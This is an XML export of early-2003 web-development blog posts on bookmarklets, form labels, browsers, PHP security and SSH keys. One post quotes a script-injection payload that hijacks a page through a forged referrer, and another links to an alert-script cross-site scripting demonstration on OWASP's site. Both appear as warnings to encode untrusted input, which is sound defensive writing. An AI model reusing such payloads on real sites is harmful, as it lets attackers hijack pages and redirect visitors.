		<field name="body">&lt;p&gt;It looks like &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/02/07.html#a1314&quot; title=&quot;Review : PHP Meetup&quot;&gt;Scott got burned&lt;/a&gt; by a &lt;a href=&quot;http://php.meetup.com/&quot;&gt;PHP MeetUp&lt;/a&gt; arranged at an out of business restaurant that then failed to materialise at all. From his comments it seems like he's not the only person to hit problems. I have yet to attend a meetup (the Bristol UK ones rarely have anyone sign up for them) but I love the concept, so it's a real shame to hear about problems like this. Hopefully the MeetUp team are working on ways to stop this kind of thing from happening - some kind of short-lived email mailing list for each location/event might go some way to ensuring people who sign up for them know what's going on and bother to show up. At least their &lt;a href=&quot;http://www.meetup.com/changes.jsp&quot;&gt;recent changes page&lt;/a&gt; shows that they have been actively trying to improve the overall experience.&lt;/p&gt;</field>
		<field name="created">2003-02-07 16:23:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">761</field>
		<field name="title">Real girls eat beef</field>
		<field name="slug">realGirlsEatBeef</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.cool-2b-real.com/&quot;&gt;Cool-2B-Real&lt;/a&gt; is a site for teenage girls. &lt;q cite=&quot;http://www.cool-2b-real.com/keep/keepinitreal.html&quot;&gt;Real girls are &quot;keepin' it real&quot; by building strong bodies and strong minds... and they're feeling great about themselves!&lt;/q&gt; It has &lt;a href=&quot;http://www.cool-2b-real.com/keep/fit/fit.html&quot;&gt;health and fitness tips&lt;/a&gt;, &lt;a href=&quot;http://www.cool-2b-real.com/keep/cool/cool.html&quot;&gt;tips on feeling good about yourself&lt;/a&gt;, a &lt;a href=&quot;http://www.cool-2b-real.com/keep/keepinitreal.html&quot;&gt;poll&lt;/a&gt; (&quot;What type of beef do you most like to eat with your friends?&quot;), and a set of &lt;a href=&quot;http://www.cool-2b-real.com/keep/snackin/smartsnackin.html&quot;&gt;Smart Snackin' recipes&lt;/a&gt; such as Nacho Beef Dip, Beef on Bamboo, Easy Beef Chili and Roast Beef and Veggie Wrap. And &lt;a href=&quot;http://www.cool-2b-real.com/funandchat/games/games.html&quot;&gt;beef games&lt;/a&gt; too.&lt;/p&gt;

&lt;p&gt;Real girls eat beef. Cool-2B-Real was brought to you by the &lt;a href=&quot;http://www.beefboard.com/&quot;&gt;Cattlemen's Beef Board&lt;/a&gt; and the &lt;a href=&quot;http://www.beef.org/&quot;&gt;National Cattlemen's Beef Association&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-02-07 16:38:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">762</field>
		<field name="title">Help needed</field>
		<field name="slug">helpNeeded</field>
		<field name="body">&lt;p&gt;Does anyone know if it is possible to find an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; element's exact position on the page (in terms of pixels-from-the-top and pixels-from-the-left) using javascript? The element I have in mind is an image that has not had any positioning applied to it, but I imagine any solution will work for other elements as well. I need something that works in Mozilla/Phoenix, although a solution for &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; would be nice as well. It's for a bookmarklet I'm thinking of writing.&lt;/p&gt;</field>
		<field name="created">2003-02-07 17:30:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">763</field>
		<field name="title">Image Drag bookmarklet</field>
		<field name="slug">imageDragBookmarklet</field>
		<field name="body">&lt;p&gt;I got a good response to &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/07/#helpNeeded&quot; title=&quot;Help Needed&quot;&gt;yesterday's call for help&lt;/a&gt; on finding an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; element's co-ordinates on a page. I ended up using PPK's &lt;a href=&quot;http://www.xs4all.nl/~ppk/js/index.html?/~ppk/js/findpos.html&quot;&gt;findPos&lt;/a&gt; functions which seemed to do the trick just fine.&lt;/p&gt;

&lt;p&gt;Here's the result:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;javascript:void(d=document);void(h=d.getElementsByTagName(&amp;apos;head&amp;apos;)[0]);void((s=d.createElement(&amp;apos;script&amp;apos;)).setAttribute(&amp;apos;src&amp;apos;,&amp;apos;http://simon.incutio.com/js/imagedrag.js&amp;apos;));void(h.appendChild(s));&quot;&gt;Image Drag&lt;/a&gt; (bookmarklet, drag on to your links bar).&lt;/p&gt;

&lt;p&gt;Image Drag makes every image on a page &quot;draggable&quot;, using youngpup's &lt;a href=&quot;http://www.youngpup.net/?request=/components/dom-drag.xml&quot;&gt;DOM-Drag library&lt;/a&gt;. It works by &quot;cloning&quot; each image on the page and making the clone an absolutely positioned, draggable element then changing the original image to a transparent pixel of the correct width and height. I wrote it because I wanted my girlfriend to be able to play with &lt;a href=&quot;http://home.iprimus.com.au/deeplypurple/html/GothMaker.htm&quot;&gt;GothMaker&lt;/a&gt; in Phoenix instead of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;, but it works for other pages too. There is a weird bug which affects any pages that use absolute positioning (such as this one) - I think it's a bug in DOM-Drag rather than a problem with findPos but I'm not entirely sure what's causing it.&lt;/p&gt;

&lt;p&gt;The bookmarklet works fine in Phoenix (on both Linux and Windows) but doesn't work in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;. I'm not too bothered about this - with &lt;acronym title=&quot;Internet Explorer 6&quot;&gt;IE6&lt;/acronym&gt; nearing &lt;a href=&quot;http://www.activewin.com/faq/ie6faq.shtml&quot; title=&quot;IE6 FAQs, includes release date information&quot;&gt;it's second birthday&lt;/a&gt; if you are still using it you should seriously considering upgrading to &lt;a href=&quot;http://www.mozilla.org/projects/phoenix/&quot;&gt;something a bit more up to date&lt;/a&gt; anyway.&lt;/p&gt;

&lt;p&gt;Since most of the sites linked to from this one use absolute positioning, here are a few which the bookmarklet works well on that are fun to mess around with:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://slashdot.org/&quot;&gt;Slashdot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.redhat.com/&quot;&gt;Red Hat&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cool-2b-real.com/&quot;&gt;Cool-2B-Real&lt;/a&gt; (yay beef).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Incidentally, although it's only meant as a fun distraction, having played with it a bit it looks like it could be quite useful as a tool for web site design tweaks such as seeing if the page would look better with images moved around a bit.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; It turns out the bookmarklet only works for pages that aren't being served with an XHTML doctype. Curious.&lt;/p&gt;</field>
		<field name="created">2003-02-08 14:59:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">764</field>
		<field name="title">Hashing client-side data</field>
		<field name="slug">hashingClientsideData</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/02/08.html#a1323&quot; title=&quot;PHP and OWASP Security&quot;&gt;Scott&lt;/a&gt;, a clever &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; technique for ensuring data sent to the browser as a cookie or hidden form variable isn't tampered with by the user:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.sklar.com/page/article/owasp-top-ten&quot;&gt;&lt;p&gt;
If you're expecting to receive data in a cookie or a hidden form field that you've previously sent to a client, make sure it hasn't been tampered with by sending a hash of the data and a secret word along with the data. Put the hash in a hidden form field (or in the cookie) along with the data. When you receive the data and the hash, re-hash the data and make sure the new hash matches the old one.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;A further explanation and example code can be found in &lt;a href=&quot;http://www.sklar.com/page/article/owasp-top-ten&quot;&gt;PHP and the OWASP Top Ten Security Vulnerabilities&lt;/a&gt;, a handy article describing how &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; coders can combat the top ten web application security problems highlighted by a recent report from &lt;a href=&quot;http://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt;. Incidentally, &lt;acronym title=&quot;The Open Web Application Security Project&quot;&gt;OWASP&lt;/acronym&gt; still haven't fixed the cross site scripting vulnerability &lt;a href=&quot;http://www.owasp.org/%3Cscript%3Ealert(%22boo%22)%3C/script%3E&quot;&gt;on their own site&lt;/a&gt;, discovered by &lt;a href=&quot;http://tom.me.uk/blog/&quot;&gt;Tom Gilder&lt;/a&gt; several weeks ago.&lt;/p&gt;

&lt;p&gt;Incidentally, while the hashing method is clever and should be nice and secure I personally advocate not sending the user &lt;em&gt;any&lt;/em&gt; information unless absolutely necessary - use sessions and store sensitive data on the server instead. I suppose you could always use the hash to add an extra layer of security to the session identifier though.&lt;/p&gt;</field>
		<field name="created">2003-02-08 23:53:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">765</field>
		<field name="title">pngcrush</field>
		<field name="slug">pngcrushRecommended</field>
		<field name="body">&lt;p&gt;Mark &lt;a href=&quot;http://diveintomark.org/archives/2003/02/08/optimizing_png_files.html&quot; title=&quot;Optimizing PNG Files&quot;&gt;invoked the lazy web&lt;/a&gt; earlier today in a bid to find a good way of bulk optimizing &lt;acronym title=&quot;Portable Network Graphics&quot;&gt;PNG&lt;/acronym&gt; files. Several people recommended &lt;a href=&quot;http://pmt.sourceforge.net/pngcrush/&quot;&gt;pngcrush&lt;/a&gt; in the comments and it sounds like a fantastically useful piece of software - apparently it can run 114 different lossless compression methods on an image and automatically chose the most efficient one.&lt;/p&gt;</field>
		<field name="created">2003-02-08 23:57:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">766</field>
		<field name="title">Nice titles</field>
		<field name="slug">niceTitles</field>
		<field name="body">&lt;p&gt;Stuart has posted yet another inobtrusive &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; gem - &lt;a href=&quot;http://www.kryogenix.org/code/browser/nicetitle/&quot;&gt;Nice Titles&lt;/a&gt;, inspired by &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000778.php&quot; title=&quot;Sharks with laser beams&quot;&gt;a thread on web graphics&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-02-11 20:30:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">767</field>
		<field name="title">Validity would be nice</field>
		<field name="slug">validityWouldBeNice</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.contenu.nu/article.htm?id=1229&quot;&gt;In-Valids&lt;/a&gt; is an enjoyable rant by Joe Clark chastising the big guys on the web for being completely incapable of producing valid &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2003-02-11 20:33:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">768</field>
		<field name="title">Label elements</field>
		<field name="slug">labelElements</field>
		<field name="body">&lt;p&gt;Peter Van Djick asks &lt;a href=&quot;http://poorbuthappy.com/ease/000882.html&quot;&gt;&lt;q cite=&quot;http://poorbuthappy.com/ease/000882.html&quot;&gt;why does hardly anyone use LABEL tags?&lt;/q&gt;&lt;/a&gt; It's a very good question - in my opinion label tags, like title attributes on links, are a complete no-brainer. They're well supported by all modern browsers, completely backwards compatible (in that there are no ill effects for older browsers), great for accessibility and easy to implement. They're much more than just an accessibility issue - the usability of a form is dramatically increased by the addition of label tags, especially for radio and check boxes where they greatly increase the &quot;target area&quot; for the user to click on.&lt;/p&gt;

&lt;p&gt;In case you haven't come across them before, here's how they work:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
&amp;lt;label for=&quot;myFormElement&quot;&amp;gt;Your name:&amp;lt;/label&amp;gt;
&amp;lt;input name=&quot;yourName&quot; type=&quot;text&quot; id=&quot;myFormElement&quot; /&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;for&lt;/code&gt; attribute on the label links it to the form element with that ID. When the user clicks on the label, their cursor will jump to the form field. If the targetted form element is a check box or radio box clicking the label text will toggle it. Labels can by styled using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; just like any other element - I often use &lt;code&gt;display: block&lt;/code&gt; to stack them above their corresponding form elements to save me from having to mess around with the layout of a form, as can be seen on my &lt;a href=&quot;/contact/&quot;&gt;Contact Page&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you aren't using &lt;code&gt;label&lt;/code&gt; elements, now's the time to start.&lt;/p&gt;</field>
		<field name="created">2003-02-11 23:42:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">769</field>
		<field name="title">Indexing hypertext</field>
		<field name="slug">indexingHypertext</field>
		<field name="body">&lt;p&gt;Dorothea Salo explains &lt;a href=&quot;http://www.yarinareth.net/caveatlector/archive/week_2003_02_09.html#e001284&quot; title=&quot;Hypertext and indexes&quot;&gt;the thorny problem of indexing&lt;/a&gt; (the back-of-a-book kind rather than the search-engine-spider kind) marked up electronic documents. Another example of what my first year software engineering lecturer would call a &quot;wicked problem&quot;.&lt;/p&gt;</field>
		<field name="created">2003-02-11 23:47:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">770</field>
		<field name="title">Image Drag bookmarklet fixed</field>
		<field name="slug">bookmarkletFixed</field>
		<field name="body">&lt;p&gt;Boris Zbarsky &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/08/imageDragBookmarklet#comments&quot; title=&quot;Image Drag Bookmarklet: Comments&quot;&gt;offered a fix&lt;/a&gt; for my image drag bookmarklet's problems in Strict doctype pages. The problem was due to Mozilla, when operating in strict mode, refusing to absolutely position elements that don't have a unit of measurement specified. The bookmarklet now works perfectly on pretty much every page I've tried it on.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;javascript:void(d=document);void(h=d.getElementsByTagName(&amp;apos;head&amp;apos;)[0]);void((s=d.createElement(&amp;apos;script&amp;apos;)).setAttribute(&amp;apos;src&amp;apos;,&amp;apos;http://simon.incutio.com/js/imagedrag.js&amp;apos;));void(h.appendChild(s));&quot;&gt;Image Drag&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2003-02-13 23:54:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">771</field>
		<field name="title">Classes for pages</field>
		<field name="slug">classesForPages</field>
		<field name="body">&lt;p&gt;This weekend I started work on my latest web project, further details of which will no doubt follow soon. For the moment I'll just say that it follows the classic news/articles/users with logins model - basically another small-to-medium sized &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; content management system.&lt;/p&gt;

&lt;p&gt;This time I told myself firmly that I wasn't going to reinvent the wheel and I wasn't going to build myself yet another web framework library. I had a look at a whole bunch of Open Source systems (mostly thanks to &lt;a href=&quot;http://www.opensourcecms.com/&quot;&gt;opensourceCMS&lt;/a&gt; but none of them seemed to fit my (admittedly pretty stringent) requirements. I was looking for something flexible and easily modified with a well defined &lt;acronym title=&quot;Applications Programming Interface&quot;&gt;API&lt;/acronym&gt;, strictly standards compliant, structural/semantic templates, excellent &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; support, an easily extended user and permissions system, a powerful but straight forward control panel and a well designed, object oriented code base. It also had to be suitable for a team of programmers to hack on together, as the site will be maintained by a group of coders. With requirements like that maybe it's not surprising that nothing fitted the bill, so I resigned myself to starting from scratch.&lt;/p&gt;

&lt;p&gt;I said I wasn't going to build a framework, and that really was my intention, but yesterday afternoon I hit on an idea that just got my itching to write some code. The way I see it, the structure of an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; page is just asking to be represented with a class. All pages have a doctype, a title, a head with a bunch of script / link elements, and a body. Further more, almost all &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; designs depend on a number of div elements one after another in the body. Using these points as guidance, I quickly created a Page class that was capable of gathering this information over time until the &lt;code&gt;display()&lt;/code&gt; method prompted it to render itself as &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;, or &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; if that doctype was specified.&lt;/p&gt;

&lt;p&gt;This class on its own is not much use, but the beautiful thing about using classes is that they can be extended. I created a second class, SitePage, which extended Page and performed some site specific cusotmisations such as adding the standard site header and menu divs and setting the stylesheet. Further extensions of this class will allow me to create more specialised templates for specific areas of the site. The code I have so far only took a few hours to write and is already proving to be a very productive way of controlling the overall look of the site.&lt;/p&gt;

&lt;p&gt;My original intentions may have gone up in smoke, but I'm very happy with the code that's been developing. I just hope it stands up to the scrutiny of my fellow coders... if not, it's definitely been a productive learning experience.&lt;/p&gt;</field>
		<field name="created">2003-02-15 23:33:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">772</field>
		<field name="title">micro_httpd</field>
		<field name="slug">microHttpd</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.acme.com/software/micro_httpd/&quot;&gt;micro_httpd&lt;/a&gt; is &lt;q cite=&quot;http://www.acme.com/software/micro_httpd/&quot;&gt;a very small Unix-based HTTP server&lt;/q&gt; - so small in fact that it is implemented in just 150 lines of C. From the perspective of a relative C newbie the code makes fun reading.&lt;/p&gt;</field>
		<field name="created">2003-02-15 23:37:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">773</field>
		<field name="title">Agent Frank</field>
		<field name="slug">agentFrank</field>
		<field name="body">&lt;p&gt;l.m.orchard has &lt;a href=&quot;http://www.decafbad.com/news_archives/000411.phtml&quot; title=&quot;Say hello to Agent Frank &quot;&gt;released&lt;/a&gt; the code for his oft-discussed personal web proxy in the form of &lt;a href=&quot;http://www.decafbad.com/twiki/bin/view/Main/AgentFrank&quot;&gt;Agent Frank&lt;/a&gt;. It looks really neat, but unfortunately as it's written in Java and I don't have space on my shiny new Linux install to get Java set up I can't play with it yet (looks like I'll have to finally shell out for the new hard drive I've been promising myself). Cute logo though :)&lt;/p&gt;</field>
		<field name="created">2003-02-15 23:46:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">774</field>
		<field name="title">Google aquire Blogger</field>
		<field name="slug">googleAquireBlogger</field>
		<field name="body">&lt;p&gt;Lots of analysis around the blogosphere today of Google's &lt;a href=&quot;http://weblog.siliconvalley.com/column/dangillmor/archives/000802.shtml#000802&quot; title=&quot;Google Buys Pyra: Blogging Goes Big-Time&quot;&gt;surprise aquisition of Blogger&lt;/a&gt;. &lt;a href=&quot;http://boingboing.net/2003_02_01_archive.html#90330803&quot; title=&quot;Gbloogle: what it all (may) mean&quot;&gt;Cory Doctorow's analysis&lt;/a&gt; is (in my opinion) especially worth reading. Personally, I just hope Google do something about Blogger's revolting archive &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt;s :)&lt;/p&gt;</field>
		<field name="created">2003-02-16 22:02:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">775</field>
		<field name="title">Eric Meyer's colour blender</field>
		<field name="slug">ericMeyersColorBlender</field>
		<field name="body">&lt;p&gt;Eric Meyer's &lt;a href=&quot;http://www.meyerweb.com/eric/tools/color-blend/&quot;&gt;Color Blender&lt;/a&gt; is an incredibly useful tool for picking colours for a web site. Give it two different hexadecimal colour codes and it will calculuate and display between 1 and 10 &quot;midpoint&quot; colours. It's fun to play with and great for tracking down that elusive perfect shade of green...&lt;/p&gt;</field>
		<field name="created">2003-02-16 23:01:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">776</field>
		<field name="title">SQL slammer analysed</field>
		<field name="slug">sqlSlammerAnalysed</field>
		<field name="body">&lt;p&gt;Robert Graham's &lt;a href=&quot;http://www.robertgraham.com/journal/030126-sqlslammer.html&quot; title=&quot;Advisory: SQL slammer&quot;&gt;analysis of SQL Slammer&lt;/a&gt; cleared up quite a few things I had been wondering about the worm. It confirms that the majority of the infections were caused not by SQL Server (as reported widely by the press) but by the embedded &lt;acronym title=&quot;Microsoft Database Embedded&quot;&gt;MSDE&lt;/acronym&gt; component, which is far less likely to be patched (or firewalled off from the public internet) than SQL Server.&lt;/p&gt;

&lt;p&gt;Incidentally, Curious Yellow is a fascinating explanation of a theoretical &quot;co-ordinated super-worm&quot; capable of adapting to attempts to combat it using advanced peeer to peer techniques. It is an extension of the &lt;a href=&quot;http://www.cs.berkeley.edu/~nweaver/warhol.html&quot;&gt;Warhol worm&lt;/a&gt; concept where a worm that pre-scans the internet for targets could infect all susceptile hots world-wide in less than 30 seconds. Scary stuff.&lt;/p&gt;</field>
		<field name="created">2003-02-16 23:11:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">777</field>
		<field name="title">DNS mess</field>
		<field name="slug">dnsMess</field>
		<field name="body">&lt;p&gt;As the recent lack of updates demonstrates, I've been getting stuck in to a pretty time consuming new project. It should have launched several days ago but I made a right royal hash of the &lt;acronym title=&quot;Domain Name Service&quot;&gt;DNS&lt;/acronym&gt; settings - hopefully everything will be working fine in about 24 hours time.&lt;/p&gt;

&lt;p&gt;Note to &lt;a href=&quot;http://www.123-reg.co.uk/&quot;&gt;123-reg&lt;/a&gt;: most people only have to mess around with &lt;acronym title=&quot;Domain Name Service&quot;&gt;DNS&lt;/acronym&gt; and nameserver settings one or twice a year. If the interface for doing so is anything less than 100% clear they're going to run in to problems. A warning message to the tune of &quot;make sure you know exactly what you are doing before you touch this&quot; just doesn't cut it.&lt;/p&gt;</field>
		<field name="created">2003-02-20 17:24:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">778</field>
		<field name="title">Calendars and crawlers</field>
		<field name="slug">calendarsAndCrawlers</field>
		<field name="body">&lt;p&gt;Douglas Bowman has been &lt;a href=&quot;http://www.stopdesign.com/log/default.asp?date=20030218&quot; title=&quot;In the Year of Our Lord&quot;&gt;having some amusing problems&lt;/a&gt; with robots and his calendar. The calendar, visible on every page of the site, automatically adds a &quot;next month&quot; and &quot;previous month&quot; link to allow surfers to browser through the archive in both directions. Unfortunately, Doug ommitted the logic to stop showing a &quot;previous month&quot; link when there were no earlier entries. An enterprising crawler started following the links, and didn't stop until it had reached 1542!&lt;/p&gt;

&lt;p&gt;I've written a few dynamic calendars in the past and I'm pretty sure at least one of them was susceptible to this kind of bug. Definitely one to watch out for.&lt;/p&gt;</field>
		<field name="created">2003-02-20 17:26:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">779</field>
		<field name="title">Get a better browser!</field>
		<field name="slug">getABetterBrowser</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://radio.weblogs.com/0103807/2003/02/20.html#a1374&quot; title=&quot;Calling it Like it Is&quot;&gt;Via Scott&lt;/a&gt;, this &lt;a href=&quot;http://radio.weblogs.com/0117167/2003/02/18.html#a138&quot; title=&quot;They still make browsers?&quot;&gt;oh-so-true quote&lt;/a&gt; from a Microsoft &quot;next-generation technology&quot; consultant:&lt;/p&gt;

&lt;blockquote cite=&quot;http://radio.weblogs.com/0117167/2003/02/18.html#a138&quot;&gt;&lt;p&gt;
Internet Explorer hasn't had any revolutionary features for over 3 versions now.  And it's now surprise why.  No outside push.  Not to say Internet Explorer is bad.  But I use it more because it's always there not because it's necessarily better than other alternatives that I would have to download and install.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I've been telling my friend's something similar for a while. Internet Explorer 6 is now over a year and a half old, and in my opinion just doesn't cut it as a serious browsing platform any more. It's fine for casual use, but if like me you spend well over an hour every day surfing the web you would almost certainly be better off with something more capable. Pop-up blocking, tabbed browsing and fixed-sized-font resizing all go a long way towards making the web a more pleasant and productive place - not to mention the fact that most &lt;em&gt;really&lt;/em&gt; lame advertising techniques use &lt;acronym title=&quot;MicroSoft&quot;&gt;MS&lt;/acronym&gt; proprietary &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; and fail to work at all in other browsers.&lt;/p&gt;

&lt;p&gt;It's not like the alternative options are even particularly arduous to install. &lt;a href=&quot;http://www.opera.com/download/&quot;&gt;Opera 7 for Windows&lt;/a&gt; weighs in at a paltry 3.2 &lt;acronym title=&quot;MegaBytes&quot;&gt;MB&lt;/acronym&gt; without Java support and &lt;a href=&quot;http://www.mozilla.org/projects/phoenix/phoenix-release-notes.html&quot; title=&quot;Phoenix 0.5 (Naples)&quot;&gt;Phoenix&lt;/a&gt; (my browser of choice) is only 6.2 &lt;acronym title=&quot;MegaBytes&quot;&gt;MB&lt;/acronym&gt;. Both install without making any unpleasant changes to your system and are easy to remove if you decide you don't like them. If you do a lot of web development Mozilla offers a superb range of web development related tools for only a 11 &lt;acronym title=&quot;MegaBytes&quot;&gt;MB&lt;/acronym&gt; of your valuable download time.&lt;/p&gt;

&lt;p&gt;The only reason I can see to stick with &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; is if you frequently work with a web-based application that requires proprietary &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; extensions (such as the ever problematic &lt;code&gt;contentEditable&lt;/code&gt;), and of course for testing sites to ensure they stay compatible with the web's most wide-spread browser. For every day web browsing you can be a lot more productive with something else.&lt;/p&gt;

&lt;p&gt;Further reading:&lt;/p&gt;
&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.tntluoma.com/opera/lover/&quot;&gt;30 days to becoming an Opera lover&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.xulplanet.com/ndeakin/arts/reasons.html&quot;&gt;101 things you can do in Mozilla&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-02-20 17:28:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">780</field>
		<field name="title">Watch out for Javascript in referrals</field>
		<field name="slug">referrerJavascriptWarning</field>
		<field name="body">&lt;p&gt;Here's a good reminder why you should &lt;em&gt;always&lt;/em&gt; encode &amp;lt; and &amp;gt; as &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; entities when displaying content from an untrusted (i.e external) source: Kasia in a nutshell &lt;a href=&quot;http://www.unix-girl.com/blog/archives/000726.html&quot; title=&quot;Displaying referer links on blogs&quot;&gt;was hit&lt;/a&gt; by a false referrer containing javascript deliberately aimed at hijacking the page the referrer was displayed on:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;top.location.href='http://redirect_to_this_assholes_page';&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;She even got a &lt;a href=&quot;http://www.theregister.co.uk/content/55/29396.html&quot; title=&quot;Watch out for those malicious referrer links&quot;&gt;link from The Register&lt;/a&gt; for her troubles.&lt;/p&gt;</field>
		<field name="created">2003-02-20 17:38:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">781</field>
		<field name="title">More Python advocacy</field>
		<field name="slug">morePythonAdvocacy</field>
		<field name="body">&lt;p&gt;Intelligent Enterprise: &lt;a href=&quot;http://www.intelligententerprise.com/030301/604e_business1_1.shtml&quot;&gt;&lt;q cite=&quot;http://www.intelligententerprise.com/030301/604e_business1_1.shtml&quot;&gt;For all of you unfamiliar with Python, get ready for the &quot;next big thing.&quot;&lt;/q&gt;&lt;/a&gt;&lt;/p&gt;</field>
		<field name="created">2003-02-20 17:42:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">782</field>
		<field name="title">Python for Java programmers</field>
		<field name="slug">pythonForJavaProgrammers</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://luxor-xul.sourceforge.net/talk/jug-feb-2003/slides.html&quot;&gt;Python and Jelly: Scripting Power for Java and XML&lt;/a&gt; incorporates an excellent introduction to Python and Jython for Java programmers, with a whole bunch of comparative code samples and comprehensive coverage of differences between the two languages.&lt;/p&gt;</field>
		<field name="created">2003-02-20 17:45:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">783</field>
		<field name="title">SSH public key authentication</field>
		<field name="slug">sshPublicKeyAuthentication</field>
		<field name="body">&lt;p&gt;I've been having fun with &lt;acronym title=&quot;Secure SHell&quot;&gt;SSH&lt;/acronym&gt; lately. Did you know you can set up &lt;acronym title=&quot;Secure SHell&quot;&gt;SSH&lt;/acronym&gt; so you can log in to servers without having to provide a password? It's called &quot;public key authentication&quot; and is apparently &lt;em&gt;more&lt;/em&gt; secure than using a normal password. You generate a public/private key using a program called &lt;code&gt;ssh-keygen&lt;/code&gt;, and store a copy of the public key on the server(s) you wish to authenticate with. When you attempt to log in, the server sends you a message encrypted with your public key - your machine decrypts it and sends back the original message, proving your identity.&lt;/p&gt;

